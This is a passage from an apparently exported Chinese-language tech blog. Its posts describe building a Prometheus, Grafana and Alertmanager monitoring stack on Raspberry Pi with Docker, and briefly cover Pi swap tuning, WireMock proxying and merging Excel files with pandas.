/:/rootfs:ro\n    command:\n      - '--path.procfs=/host/proc'\n      - '--path.sysfs=/host/sys'\n      - --collector.filesystem.ignored-mount-points\n      - \"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\"\n    expose:\n      - '9100'\n```\n\n\ndockr-compose up 起來\n\nprometheus/config.yml 修改\n```yaml=\n  - job_name: 'node-exporter'\n    # Override the global default and scrape targets from this job every 5 seconds.\n    # metrics_path defaults to '/metrics'\n    # scheme defaults to 'http'.\n    scrape_interval: 5s\n    static_configs:\n      - targets:\n        - 'node_exporter:9100'\n        - '192.168.1.xx:9100'\n        - '192.168.1.xx:9100'\n```\n\n有遇到\n\n```\nERROR: Version in \"./docker-compose.yml\" is unsupported. You might be seeing this error because you're using the wrong Compose file version. Either specify a supported version (e.g \"2.2\" or \"3.3\") and place your service definitions under the `services` key, or omit the `version` key and place your service definitions at the root of the file to use version 1.\nFor more on the Compose file format versions, see https://docs.docker.com/compose/compose-file/\n\n```\n請更新 docker-compose version\n\narmv6 (pi 1 ) 不能跑\n自己找網路上 build 都失敗\n仔細想想，真的 PI 效能真的很低\n所以就不放這個了\n\n\n[1 Node Exporter for Prometheus Dashboard CN v20201010 dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/8919)\n[Node Exporter Full dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/1860)\n\n## tranmission \n\n- [GitHub - sandrotosi/simple-transmission-exporter: A simple Prometheus exporter for Transmission](https://github.com/sandrotosi/simple-transmission-exporter)\n- [GitHub - metalmatze/transmission-exporter: Prometheus exporter for Transmission metrics, written in Go.](https://github.com/metalmatze/transmission-exporter)\n\n仔細看了一下 dashboard \n兩個差異還滿大的\n主要我是要看網路傳輸速度\n所以我這邊選擇 python 版本\n\n```bash=\ngit clone https://github.com/sandrotosi/simple-transmission-exporter.git\n\n# 修改 Dockerfile 為 arm32v7\n```\n\n```dockerfile=\nFROM arm32v7/python:3.9\n...\n```\n\n```bash=\ndocker build -t transmission_exporter .\n\ndocker run -e TRANSMISSION_HOST=192.168.x.x \\\n           -e TRANSMISSION_PORT=9091 \\\n           -e TRANSMISSION_USERNAME=admin \\\n           -e TRANSMISSION_PASSWORD=xxx \\\n           -d -p 29091:29091 transmission_exporter\n```\n\nprometheus 設定增加後，重啟服務`docker-compose restart prometheus`\n```yaml=\n  - job_name: 'transmission-exporter' \n    # Override the global default and scrape targets from this job every 5 seconds.\n    # metrics_path defaults to '/metrics'\n    # scheme defaults to 'http'.\n    static_configs:\n      - targets:\n        - '192.168.1.203:29091'\n\n```\n\n調整成 docker-compose \n換成 docker-compose 就不能運作了...\n但一般docker 指令可正常執行...\n真的很奇怪\n\n```\nversion: '2'\n\nservices:\n  transmission_exporter:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    image: transmission_exporter\n    container_name: transmission_exporter\n    ports:\n     - \"29091:29091\"\n    environment:\n      - \"TRANSMISSION_HOST=192.168.1.203\"\n      - \"TRANSMISSION_PORT=9091\"\n      - \"TRANSMISSION_USERNAME=admin\"\n      - \"TRANSMISSION_PASSWORD=admin\"\n```\n\n**20210408**\n後來發現 docker-compose up 起來 IP 好像不一樣\n所以才不能跑\n\n看 transmission 設定有一個設定白名單\n\n```json\n    \"rpc-whitelist\": \"127.0.0.1,192.168.1.*,172.17.0.*\",\n    \"rpc-whitelist-enabled\": true,\n\n```\n172.17.0.* 預設會過\n但是 docker-compose 起來不是這段 IP\n\n[透過 Docker Compose 設定 network | Titangene Blog](https://titangene.github.io/article/networking-in-docker-compose.html)\n\n目前指令不先研究怎麼使用\n最快方法就是把IP調成`172.*.*.*`\n\n\n## traefik \n\n```yaml=\n    command:\n      - \"--api.insecure=true\"\n      ....(省略)\n      - \"--accesslog=true\"\n      - \"--metrics.prometheus=true\"\n\n```\n\n原生 traefik 就有支援 prometheus\n加上這個`--metrics.prometheus=true`就能使用\n\ngranafan 加表[Traefik dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/4475)會看到\n```\nPanel plugin not found: grafana-piechart-panel\n```\n\n[docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub](https://github.com/vegasbrianc/docker-traefik-prometheus/blob/master/grafana/config.monitoring)\n這邊有看到跑 docker 前\n可以在這邊設定這個\n這樣可以忽略下面安裝 plugin\n\n```bash\n[root@prometheus prometheus]# grafana-cli plugins install grafana-piechart-panel\n\ninstalling grafana-piechart-panel @ 1.6.1\n\nfrom: https://grafana.com/api/plugins/grafana-piechart-panel/versions/1.6.1/download\n\ninto: /var/lib/grafana/plugins\n\n \n\n✔ Installed grafana-piechart-panel successfully \n\n \n\nRestart grafana after installing plugins . <service grafana-server restart>\n\n[root@prometheus prometheus]# systemctl restart grafana-server.service \n```\n\n\n參考:[解决Panel plugin not found: grafana-piechart-panel - 知我知行](https://lian.st/4077.html)\n\n\n但我這邊是用docker\n```\ndocker-compose exec grafana bash\ngrafana-cli plugins install grafana-piechart-panel\n```\n\n我後來是用這個 dashboard\n[Traefik 2.2 dashboard for Grafana | Grafana Labs](https://grafana.com/grafana/dashboards/12250)\n\n後來發我現[docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub](https://github.com/vegasbrianc/docker-traefik-prometheus/blob/master/grafana/config.monitoring)\n\n```\nGF_INSTALL_PLUGINS=grafana-piechart-panel\n```\n\n\n## process exporter\n\n目前沒用到\n是看程式有沒有執行\n但目前相對程式都有 exporter\n就沒有使用\n\n[Prometheus — Process-exporter进程监控 - huandada - 博客园](https://www.cnblogs.com/huandada/p/10431667.html)\n\n## Blackbox Exporter\n\n老實說，剛看好難入手\n實作完才知道大概在做什麼\n\n簡單來說，所有控制點都在 prometheus \nblackbox 都是收到接收做事情簡查\n\n不多說，馬上實作\n先`git clone https://github.com/prometheus/blackbox_exporter.git`下來\n\n```bash\ndocker run --rm -d -p 9115:9115 --name blackbox_exporter -v `pwd`:/config prom/blackbox-exporter:master --config.file=/config/blackbox.yml\n```\n\nprometheus 設定\n```yaml\n  - job_name: 'blackbox'\n    metrics_path: /probe\n    params:\n      module: [http_2xx]  # Look for a HTTP 200 response.\n    static_configs:\n      - targets:\n        - https://xxx.web   # Target to probe with https.\n    relabel_configs:\n      - source_labels: [__address__]\n        target_label: __param_target\n      - source_labels: [__param_target]\n        target_label: instance\n      - target_label: __address__\n        replacement: 192.168.1.203:9115  # The blackbox exporter's real hostname:port.\n\n  - job_name: blackbox-ping\n    metrics_path: /probe\n    params:\n      module: [icmp]\n    static_configs:\n      - targets:\n        - 192.168.1.xx   # <== Put here your targets\n        - 192.168.1.xx   # <== Put here your targets\n    relabel_configs:    # <== This comes from the blackbox exporter README\n      - source_labels: [__address__]\n        target_label: __param_target\n      - source_labels: [__param_target]\n        target_label: instance\n      - target_label: __address__\n        replacement: 192.168.1.203:9115 # Blackbox exporter.\n\n```\n\n接下來重啟 `dokcer-compose restart prometheus`\n就能解決了\n\n\n調整為 docker-compose \n\n```yaml\nversion: '3.3'\n\nservices:\n  blackbox_exporter:\n    image: prom/blackbox-exporter:master\n    container_name: blackbox_exporter\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - $PWD:/config\n    command:\n      - '--config.file=/config/blackbox.yml'\n    expose:\n      - '9115'\n    ports:\n      - 9115:9115\n```\n\n參考:\n[How to ping targets using blackbox_exporter with prometheus - Stack Overflow](https://stackoverflow.com/questions/55526487/how-to-ping-targets-using-blackbox-exporter-with-prometheus)\n\n\n\n[Blackbox Exporter 小記 - Potioneer's Essays](https://william-yeh.net/post/2020/08/blackbox-exporter/)\n[网络探测：Blackbox Exporter - prometheus-book](https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/exporter/commonly-eporter-usage/install_blackbox_exporter)\n\n[grafana 7 监控https证书过期时间 - 海口-熟练工 - 博客园](https://www.cnblogs.com/fsckzy/p/14172262.html)\n\n\n## 官方 exporter 清單\n[Exporters and integrations | Prometheus](https://prometheus.io/docs/instrumenting/exporters/)\n\n\n## 安裝 alertmanager-discord\n\n首先 git clone 下來改 arm32v7 映像檔\ngolang build 參數調整\n再 build 看看有沒有問題\n\n```bash\ngit clone https://github.com/benjojo/alertmanager-discord.git\n```\n\nDockerfile build 調整如下\n中間有遇到一些狀況\n\n```dockerfile\n# Built following https://medium.com/@chemidy/create-the-smallest-and-secured-golang-docker-image-based-on-scratch                                                           -4752223b7324\n\n# STEP 1 build executable binary\nFROM arm32v7/golang as builder\n# Install SSL ca certificates\nRUN apt update\nRUN apt install git\nRUN apt install  ca-certificates\n# Create appuser\nRUN adduser appuser\nCOPY . $GOPATH/src/mypackage/myapp/\nWORKDIR $GOPATH/src/mypackage/myapp/\n#get dependancies\nRUN go get -d -v\n#build the binary\nRUN CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -a -installsuffix cgo -ldflags=\"-w -s\" -o /go/bin/alertma                                                           nager-discord\n\n\n# STEP 2 build a small image\n# start from scratch\nFROM hypriot/rpi-alpine-scratch\nCOPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\nCOPY --from=builder /etc/passwd /etc/passwd\n# Copy our static executable\nCOPY --from=builder /go/bin/alertmanager-discord /go/bin/alertmanager-discord\n\nENV LISTEN_ADDRESS=0.0.0.0:9094\nEXPOSE 9094\nUSER appuser\nENTRYPOINT [\"/go/bin/alertmanager-discord\"]\n```\n\n```bash=\ndocker build -t alertmanager-discord .\n```\n\n完成，之前我寫的 line 測試的 curl 用在這個會失敗\n直接設定到 alertmanager 測試正常\n\n直接docker run 跑起來吧\n\n```\ndocker run --rm -d -e DISCORD_WEBHOOK=https://discord.com/api/webhooks/xxxxxxx -p 9094:9094 alertmanager-discord\n```\n\nalertmanager/config.yml\n```yaml\nroute:\n  group_by: ['alertname']\n  group_wait: 10s\n  group_interval: 10s\n  repeat_interval: 10m\n  receiver: discord_webhook\n\nreceivers:\n- name: 'live-monitoring'\n  #收邮件的邮箱\n  email_configs:\n  - to: 'your-email@163.com'\n- name: 'discord_webhook'\n  webhook_configs:\n  - url: 'http://192.168.1.203:9094'\n\n```\n\n\n把一個 exporter 看會不會有任何通知\n\n**這邊注意**\n我用 discord-alertmanager 發現 job_name 不能設定 `_`樣子\n導致有時候發送訊息會異常!!\n這邊要注意一下\n\n\n## 接下來學習目標\n\n如何設定 alertmanger\n發現 PromQL 還是有學必要\n因為設定 alertmanger 必須要會這個東西\n還有細項動態設定 label ...\n\n先訂好一個大坑\n\n* [Prometheus監控神器-Rules篇 - ⎝⎛CodingNote.cc ⎞⎠](https://codingnote.cc/zh-tw/p/170936/)\n* [Alertmanager 紀錄 - 系統工程師 Beck Yeh 的技術分享](https://blog.beck-yeh.idv.tw/linux/monitor/prometheus-grafana/alertmanager/)\n* [alertmanager/template at master · prometheus/alertmanager · GitHub](https://github.com/prometheus/alertmanager/tree/master/template)\n\nhttps://www.itread01.com/content/1545670504.html\n\n## 暫時用的 alertmanager rule\n\n參考一些規則:[node_exporter 配置 - 簡書](https://www.jianshu.com/p/7bec152d1a1f)\n\n```yaml\ngroups:\n- name: example\n  rules:\n\n  # Alert for any instance that is unreachable for >2 minutes.\n  - alert: service_down\n    expr: up == 0\n    for: 2m\n    labels:\n      severity: page\n    annotations:\n      summary: \"Instance {{ $labels.instance }} down\"\n      description: \"{{ $labels.instance }} of job {{ $labels.job }} has been down for more than 2 minutes.\"\n\n  - alert: 磁盤容量小於 5%\n    expr: 100 - ((node_filesystem_avail_bytes{job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"} * 100) / node_filesystem_size_bytes {job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"}) > 95\n    for: 2m\n    annotations:\n      summary: \"服務器實例 {{ $labels.instance }} 磁盤不足 告警通知\"\n      description: \"{{ $labels.instance }}磁盤 {{ $labels.device }} 資源 已不足 5%, 當前值: {{ $value }}\"\n\n  - alert: \"內存容量小於 20%\"\n    expr: ((node_memory_MemTotal_bytes - node_memory_MemFree_bytes - node_memory_Buffers_bytes - node_memory_Cached_bytes) / (node_memory_MemTotal_bytes )) * 100 > 80\n    for: 2m\n    labels:\n      severity: warning\n    annotations:\n      summary: \"服務器實例 {{ $labels.instance }} 內存不足 告警通知\"\n      description: \"{{ $labels.instance }}內存資源已不足 20%,當前值: {{ $value }}\"\n\n  - alert: \"CPU 平均負載大於 4 個\"\n    expr: node_load5 > 4\n    for: 2m\n    annotations:\n      sumary: \"服務器實例 {{ $labels.instance }} CPU 負載 告警通知\"\n      description: \"{{ $labels.instance }}CPU 平均負載(5 分鐘) 已超過 4 ,當前值: {{ $value }}\"\n\n  - alert: \"磁盤讀 I/O 超過 30MB/s\"\n    expr: irate(node_disk_read_bytes_total{device=\"sda\"}[1m]) > 30000000\n    for: 2m\n    annotations:\n      sumary: \"服務器實例 {{ $labels.instance }} I/O 讀負載 告警通知\"\n      description: \"{{ $labels.instance }}I/O 每分鐘讀已超過 30MB/s,當前值: {{ $value }}\"\n\n  - alert: \"磁盤寫 I/O 超過 30MB/s\"\n    expr: irate(node_disk_written_bytes_total{device=\"sda\"}[1m]) > 30000000\n    for: 2m\n    annotations:\n      sumary: \"服務器實例 {{ $labels.instance }} I/O 寫負載 告警通知\"\n      description: \"{{ $labels.instance }}I/O 每分鐘寫已超過 30MB/s,當前值: {{ $value }}\"\n\n  - alert: \"網卡流出速率大於 10MB/s\"\n    expr: (irate(node_network_transmit_bytes_total{device!~\"lo\"}[1m]) / 1000) > 1000000\n    for: 2m\n    annotations:\n      sumary: \"服務器實例 {{ $labels.instance }} 網卡流量負載 告警通知\"\n      description: \"{{ $labels.instance }}網卡 {{ $labels.device }} 流量已經超過 10MB/s, 當前值: {{ $value }}\"\n\n  - alert: \"CPU 使用率大於 90%\"\n    expr: 100 - ((avg by (instance,job,env)(irate(node_cpu_seconds_total{mode=\"idle\"}[2m]))) *100) > 90\n    for: 2m\n    annotations:\n      sumary: \"服務器實例 {{ $labels.instance }} CPU 使用率 告警通知\"\n      description: \"{{ $labels.instance }}CPU 使用率已超過 90%, 當前值: {{ $value }}\"\n\n  - alert: SSLCertExpiringSoon\n    expr: probe_ssl_earliest_cert_expiry{job=\"blackbox\"} - time() < 86400 * 30\n    for: 1d\n```\n\n最後有看到這個網站有一堆 rule 可以參考\n[Awesome Prometheus alerts | Collection of alerting rules](https://awesome-prometheus-alerts.grep.to/rules.html)\n\n\n## 2021-04-14 發生問題\n\n上 Grafana 看不到 Prometheus 資料\n看 log 發現\n```\nprometheus       | level=info ts=2021-04-14T12:32:25.883Z caller=head.go:768 component=tsdb msg=\"WAL segment loaded\" segment=185 maxSegment=503\nprometheus       | panic: runtime error: invalid memory address or nil pointer dereference\nprometheus       | [signal SIGSEGV: segmentation violation code=0x1 addr=0xc pc=0x17127f8]\nprometheus       |\nprometheus       | goroutine 590 [running]:\nprometheus       | bufio.(*Writer).Available(...)\nprometheus       |      /usr/local/go/src/bufio/bufio.go:624\nprometheus       | github.com/prometheus/prometheus/tsdb/chunks.(*ChunkDiskMapper).WriteChunk(0x3d39b90, 0x145c, 0x0, 0xcced3c4b, 0x178, 0xcd0878f3, 0x178, 0x26914c4, 0x4712680, 0x0, ...)\nprometheus       |      /app/tsdb/chunks/head_chunks.go:291 +0x54c\nprometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).mmapCurrentHeadChunk(0x49bf340, 0x3d39b90)\nprometheus       |      /app/tsdb/head.go:2230 +0x6c\nprometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).cutNewHeadChunk(0x49bf340, 0xcd08b38b, 0x178, 0x3d39b90, 0x0)\nprometheus       |      /app/tsdb/head.go:2204 +0x24\nprometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).append(0x49bf340, 0xcd08b38b, 0x178, 0xc1422185, 0x3fe4f164, 0x0, 0x0, 0x3d39b90, 0x10001)\nprometheus       |      /app/tsdb/head.go:2360 +0x3a8\nprometheus       | github.com/prometheus/prometheus/tsdb.(*Head).processWALSamples(0x3d22120, 0xccd1ba00, 0x178, 0x68a2180, 0x68a2140, 0x0, 0x0)\nprometheus       |      /app/tsdb/head.go:425 +0x270\nprometheus       | github.com/prometheus/prometheus/tsdb.(*Head).loadWAL.func5(0x3d22120, 0x416dde0, 0x416ddf0, 0x68a2180, 0x68a2140)\nprometheus       |      /app/tsdb/head.go:519 +0x40\nprometheus       | created by github.com/prometheus/prometheus/tsdb.(*Head).loadWAL\nprometheus       |      /app/tsdb/head.go:518 +0x268\nprometheus       | level=info ts=2021-04-14T12:32:41.305Z caller=main.go:380 msg=\"No time or size retention was set so using the default time retention\" duration=15d\n```\n\n~~因為我沒有用 healthcheck~~ \n後來沒看到有用的 healthcheck\nweb 介面都正常...\n\ndocker-compose restart 好像都失敗\n所以`docker-compose down -v `直接清掉重啟就正常...\n\nswap 都設2GB\nRAM 看起來都正常...\n\n後來我猜測是 Prometheus 問題\n把 volumes 清掉就正常\n\n[rpi4 docker panic: mmap, size 134217728: cannot allocate memory · Issue #8661 · prometheus/prometheus · GitHub](https://github.com/prometheus/prometheus/issues/8661)\n~~後來我有找到這個跟我一樣問題~~\n~~我目前估計用docker-compose up 執行是跑舊版~~\n~~後來我跑最新版~~\n~~但是我沒清掉 volumes 關係?(忘記)~~\n~~看似 issue 問題也是升級問題~~\n~~但我是跑到第五天才遇到問題~~\n~~麻煩的是 alertmanager 沒發通知~~\n~~很容易沒注意到~~\n確定我過5天後又發生問題\n\n\n這邊當初我應該不用下`docker-compose down -v`\n應該先 `docker-compose stop prometheus `\n`docker volume rm (volume_name)`才對\n\n\n**2021-04-25**\n\n最近又遇到這個問題\n查了一下，可能跟 Raspberry PI OS 32 位元有關係\n聽說64 位元能解決?!(不確定)\n參考:\n* [Compaction running out of memory · Issue #7483 · prometheus/prometheus · GitHub](https://github.com/prometheus/prometheus/issues/7483)\n* [3G memory free yet still panic: mmap: cannot allocate memory · Issue #7450 · prometheus/prometheus · GitHub](https://github.com/prometheus/prometheus/issues/7450)\n* [mmap: cannot allocate memory · Issue #4392 · prometheus/prometheus · GitHub](https://github.com/prometheus/prometheus/issues/4392)\n* [any way to disable sync prometheus configuration? · Issue #3725 · prometheus-operator/prometheus-operator · GitHub](https://github.com/prometheus-operator/prometheus-operator/issues/3725#issuecomment-741820940)\n\n\n> Had the same problem. Fixed it by adding a size limit for the storage with --storage.tsdb.retention.size=500MB.\n> Maybe on 32bit systems there could be a default/maximum value for storage.tsdb.retention.size, along with the warning.\nhttps://github.com/prometheus/prometheus/issues/7483#issuecomment-670512677\n\n~~這個我還沒測試~~\n2021-05-03 測試中\n\n>    Raspberry PI 3 B+\n>    Raspbian Stretch Lite October 2018\n>    prometheus, version 2.4.3+ds (branch: debian/sid, revision: 2.4.3+ds-2) installed from armhf deb package (https://packages.debian.org/sid/net/prometheus) (so I guess no 64bit on 32bit)\n>    --storage.tsdb.retention=15y --storage.tsdb.min-block-duration=2h --storage.tsdb.max-block-duration=2h but problem also appears on default settings of min/max block durations.\nhttps://github.com/prometheus/prometheus/issues/4392#issuecomment-433717839\n\n[Prometheus命令](https://vitzhou.top/20180328_prometheus_config/)\n\n~~目前使用這個方案觀察看看~~\n2021-05-03 確定跑到後面會出問題\n\n```yaml\n  prometheus:\n    image: prom/prometheus-linux-armv7\n    container_name: prometheus\n    restart: always\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - $PWD/prometheus/:/etc/prometheus/\n      - prometheus_data:/prometheus\n    command:\n      - '--config.file=/etc/prometheus/prometheus.yml'\n      - '--storage.tsdb.path=/prometheus'\n      - '--web.console.libraries=/usr/share/prometheus/console_libraries'\n      - '--web.console.templates=/usr/share/prometheus/consoles'\n      - '--storage.tsdb.retention=90d'\n      - '--storage.tsdb.min-block-duration=2h'\n      - '--storage.tsdb.max-block-duration=2h'\n    networks:\n      - monitoring\n    links:\n      - alertmanager\n      - cadvisor\n    expose:\n      - '9090'\n    ports:\n      - 9090:9090\n    depends_on:\n      - cadvisor\n```\n\n"},{"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","url":"%2Fblog%2F2021%2F04%2F05%2F%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83%2F","content":"\n\n首先，最近再找能跑的 prometheus 的 docker-compose 檔案\n快速建置流程，體驗裡面介面功能\n\n<!--more-->\n\n## 快速實例\n\nhttps://github.com/Kev1nChan/docker-prometheus\n\n\n我找到一個 Github 實例，可以馬上 docker-compose 吃到 Node Exporter 設備\n其他 Project 都不能順利執行...\n\n可以先把grafana 版號拿掉，裝最新版\n\n```yaml=\n    image: grafana/grafana\n```\ngit clone 下來\n直接執行 `docker-compose up -d`\n\n\n\n這邊可以window 可以把 `$PWD` 改成`.`\npowershell 才不會執行有問題\n\n\n\n> 使用前请修改Grafana配置文件中密码，当前admin密码为qwe123!@#\n\n\n### 設定 Grafana\n\n新增 DataSource ，選擇 Prometheus\n\n![](https://i.imgur.com/RsmdEbZ.png)\n\n\n注意!!這邊由於是裝在 docker 裡面\n我們這邊 URL 路徑是要輸入 prometheus:\n\n\n### 匯入 Dashboard \n\n很多教學，都沒有說要怎麼匯入別人寫好的 Dashboard \n剛用這個新手應該都不會用吧\n\nhttps://grafana.com/grafana/dashboards/8919\n這個網站可以找人加分享好用的 Dashboard\n\n![](https://i.imgur.com/2UUIdQ3.png)\n\n\n這邊 import 進去來後，記得要選 datasource\n\n\n![](https://i.imgur.com/3GpZ9EU.png)\n\n\n這邊 Grafana 就設定完了\n\n### 通知教學\n\n\n\n## 信箱設定\n\n假設不想用真實信箱，可以用我之前fake stmp email 工具來設定\n[maildev試用筆記 | 程式狂想筆記](https://malagege.github.io/blog/2018/12/09/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/)\n\n安裝maildev\n\n```\ndocker run -d -p 1080:80 -p 1025:25 djfarrelly/maildev\n```\n\n```bash=\nvim alertmanager/config.yml\n```\n設定 stmp 1025, tls = false ，帳號、密碼可以不用理(畢竟是假的...)\n\n```yaml=\n\nglobal:\n  #163服务器\n  smtp_smarthost: '192.168.1.113:1025'\n  #发邮件的邮箱\n  smtp_from: 'your-email@foxmail.com'\n  #发邮件的邮箱用户名，也就是你的邮箱　　　　　\n  smtp_auth_username: 'your-email@foxmail.com'\n  #发邮件的邮箱密码\n  smtp_auth_password: 'your-password'\n  #进行tls验证\n  smtp_require_tls: false\n\nroute:\n  group_by: ['alertname']\n  group_wait: 10s\n  group_interval: 10s\n  repeat_interval: 10m\n  receiver: live-monitoring\n\nreceivers:\n- name: 'live-monitoring'\n  #收邮件的邮箱\n  email_configs:\n  - to: 'your-email@163.com'\n```\n\n讓你的 alertmanager 發送 mail\n只需要讓你 node_exporter 結束程式就可以了\n\n```bash=\ndocker-compose stop node_exporter   \n```\n\n執行完，稍後兩分鐘...(因為設定是兩分鐘)，可以看到mail 會發送到maildev\n\n![](https://i.imgur.com/RewTNHy.png)\n\n話說 granafan 也有通知功能\n\n### discord 通知\n\n[GitHub - benjojo/alertmanager-discord: Take your alertmanager alerts, into discord](https://github.com/benjojo/alertmanager-discord)\n\n相關建置我後面文章有講到\n\n### line 通知\n\n[[教學] 如何使用 Line Notify 對群組進行通知 | 辛比誌](https://xenby.com/b/274-%E6%95%99%E5%AD%B8-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-line-notify-%E5%B0%8D%E7%BE%A4%E7%B5%84%E9%80%B2%E8%A1%8C%E9%80%9A%E7%9F%A5)\n設定 line notify ，不需要服務登入\n![](https://i.imgur.com/G110MnW.png)\n\n\nhttps://stackoverflow.com/questions/53372935/how-can-i-config-prometheus-alert-with-line-notify\n<--這個連結不能使用\n\n\n**TOKEN記得要留著，否則之後不會找到**\n\n記得要邀請 line notify 到聊天裡面去\n![](https://i.imgur.com/Dyf1Fda.png)\n\n否則不會收到\n\n> 此帳號尚未被邀請至已連動「測試bot」的群組中。請將此帳號邀請至「去」中。\n\n### 架設 line notify gateway\n\n官方沒推薦使用哪一個line notify \n可能國外很少用\n\n這篇有找到[line-notify-gateway (2). ใน blog… | by Nont Banditwong | Medium](https://nontster.medium.com/line-notify-gateway-2-f117c20c6f62)\n雖然看不懂裡面文章\n但從指令可以看出東西\n\n```bash=\ndocker run -d -p 18081:18081 -e line-notify.personal-access-token='{換成你的TOKEN}' --name line-notify-gateway nontster/line-notify-gateway\n```\n\n```yaml= alertmanager/config.yml\nreceivers:\n- name: line-noti\n  webhook_configs:\n  - url: http://192.168.73.161:18081/v1/alertmanager/payload\n    send_resolved: true\n```\n\n測試alertmanager 訊息\n```bash=\ncurl -H \"Content-type: application/json\" -X POST -d '{\"recei\"status\":\"firing\",\"alerts\":[{\"status\":\"firing\",\"labels\":{\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"},\"annotations\":{\"description\":\"director1:9100 of job ipvs has been down for  more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"},\"startsAt\":\"2019-06-09T09:12:56.795099989Z\",\"endsAt\":\"0001-01-01T00:00:00Z\",\"generatorURL\":\"http://72426f0cd030:9090/graph?g0.expr=up+%3D%3D+0&g0.tab=1\"}],\"groupLabels\":{\"alertname\":\"InstanceDown\"},\"commonLabels\":{\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"},\"commonAnnotations\":{\"description\":\"director1:9100 of job ipvs has been down for  more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"},\"externalURL\":\"http://alertmanager:9093\",\"version\":\"4\",\"groupKey\":\"{}:{alertname=\\\"InstanceDown\\\"}\"}' http://localhost:18081/v1/alertmanager/payload\n```\n\n測試結果可進行運行\n\n## 監控\n\n裡面有內建設定 exporter 服務沒偵測到兩分鐘會發送通知\n除了這些外，還有 traefik exporter ,blackbox exporter, 各種 exporter等等\n\n[Exporters and integrations | Prometheus](https://prometheus.io/docs/instrumenting/exporters/)\n\n接下來還有很長一段要學習的路","tags":["exporter"],"categories":["Prometheus"]},{"title":"Raspberry Pi 調整 swap 虛擬記憶體","url":"%2Fblog%2F2021%2F04%2F04%2FRaspberry-Pi-%E8%AA%BF%E6%95%B4-swap-%E8%99%9B%E6%93%AC%E8%A8%98%E6%86%B6%E9%AB%94%2F","content":"\n最近用 prometheus 設定兩台樹梅派\nSwap 吃到99%~100%\n樹梅派預設都是設定100MB\n目前曾經 transmission 有因為記憶體不足關係\n有中斷過...，因為記憶體關係\n\n<!--more-->\n\n調大 SWAP 參考[樹莓派 Raspberry Pi 記憶體不足當機？調整 Swap 交換空間大小解決 - G. T. Wang](https://blog.gtwang.org/iot/raspberry-pi/raspberry-pi-swap-configuration-using-usb-stick/)\n\n```bash\nsudo vim /etc/dphys-swapfile\n\n# 100MB設定注解\n# 設定 CONF_SWAPFACTOR=2\nsudo service dphys-swapfile restart\n```\n\n完成\n再觀查這幾個還會不會吃到快滿狀況","tags":["swap"],"categories":["Linux"]},{"title":"wiremock 反向代理方法","url":"%2Fblog%2F2021%2F03%2F31%2Fwiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95%2F","content":"\n最近寫好 mock api 完後，剛好開發環境也完成了\n想直接在本機測試\n想說 wiremock 有沒有反向代理方法\n結果還真的有耶!!\n\n<!--more-->\n\n先前文章有用過\n\n[Proxying - WireMock](http://wiremock.org/docs/proxying/)\n\n```json\n{\n    \"request\": {\n        \"method\": \"ANY\",\n        \"urlPattern\": \"/project/.*\"\n    },\n    \"response\": {\n        \"proxyBaseUrl\" : \"http://localhost:8080/\"\n    }\n}\n```\n\n\n[Stubbing - WireMock](http://wiremock.org/docs/stubbing/)\n\n> HTTP methods currently supported are: GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS. You can specify ANY if you want the stub mapping to match on any request method.\n\n\n\n未來有空來寫寫看 Rand 非特定字串(如:UUID,TOKEN之類的)\n\n## Rand \n\nhttp://wiremock.org/docs/response-templating/","tags":["wiremock"],"categories":["實用工具"]},{"title":"多個 Excel(xlsx) 合併方法","url":"%2Fblog%2F2021%2F03%2F31%2F%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95%2F","content":"\n平常維運大量資料，需要分批去撈資料\n需要把資料合併又要花很多工\n最近在找有什麼好用的方法\n\n<!--more-->\n\n## Excel Merger(付費)\n\nhttps://www.azofreeware.com/2020/06/excel-merger.html\n\n![](https://i.imgur.com/xDd8DbS.png)\n\n免費版會有 Excel Merger Free 字眼，所以應該沒辦法免費使用...\n\n\n## pandas \n\n建議直接安裝Anaconda3 \n\n\n```\n\nimport pandas as pd\nimport numpy as np\n\n--\n!dir /D *xlsx\n# window 沒 ls\n---\nimport glob\nglob.glob(\"*xlsx\")\n\n---\n\nall_data = pd.DataFrame()\nfor f in glob.glob(\"*xlsx\"):\n    df = pd.read_excel(f)\n    all_data = all_data.append(df,ignore_index=True)\n    \n---    \n\nall_data.to_excel(\"result.xlsx\")\n```\n\n參考: [Combining Data From Multiple Excel Files - Practical Business Python](https://pbpython.com/excel-file-combine.html)\n\n","tags":["excel merge"],"categories":["實用工具"]},{"title":"在 Raspberry Pi 建置 